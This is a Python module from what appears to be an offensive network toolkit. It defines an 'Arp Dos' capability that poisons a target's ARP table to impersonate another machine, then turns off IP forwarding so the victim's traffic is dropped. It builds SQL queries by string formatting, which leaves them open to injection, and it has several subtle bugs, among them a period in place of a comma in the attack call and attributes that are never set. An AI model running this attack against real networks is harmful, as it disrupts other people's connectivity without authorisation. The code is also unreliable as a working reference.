from arpBegin import *
import os
from capability import *

#masq_ip: ip we masquerade as.
#masc_mac: Masqueraded mac address
#source_mac: Our mac address
#Dest IP: target ip
#Dest Mac: target mac address
#ex: arpSpoof("10.0.0.1", "00:0c:29:5f:e7:50", "b8:27:eb:c2:1c:52", "10.0.0.57", "00:0c:29:08:45:1a")
class arpDos(Capability):

    def __init__(self):
        self.name = "Arp Dos"
        '''self.options = {
            "masq_ip"   : Option("masq_ip", "", "IP to Masquerade as", True),
            "masq_mac"   : Option("masq_mac", "", "MAC to Masquerade as", True),
            "source_mac"   : Option("source_mac", "", "Mac Address to send traffic to", True),
            "dest_ip"   : Option("dest_ip", "", "IP address of target", True),
            "dest_mac"   : Option("dest_mac", "", "Mac address of target", True),
        }'''
        self.options = {
            "masq" : Option("masq", "", "ID of the computer to masquerade as", True),
            "source": Option("source", "", "ID of the source computer", True),
            "dest": Option("dest", "", "ID of the target", True),
            }
        self.help_text = INFO + "Spoof the arp table of a target with our ip. We will not forward their traffic, effectively DOSsing them."

    def getVars(self):
        self.masq_ip = exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
        self.masq_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("masq")))
        self.source_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("source")))
        self.dest_ip = self.exec_command("SELECT IP FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))
        self.dest_mac = self.exec_command("SELECT MAC FROM COMPUTERS WHERE ID = '{0}'".format(self.get_value("dest")))

    def arpGo(self):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        return arpBegin(self.masq_ip, self.masq_mac, self.source_mac. self.dest_ip, self.dest_mac)
   
    def restore(self):
        self.proc.terminate()
        arpEnd(self.get_value("masq_ip"), self.get_value("masq_mac"), self.get_value("dest_ip"), self.get_value("dest_mac"))

    def launch(self):
        self.getVars()
        self.proc = self.arpGo()
        return self.proc
        
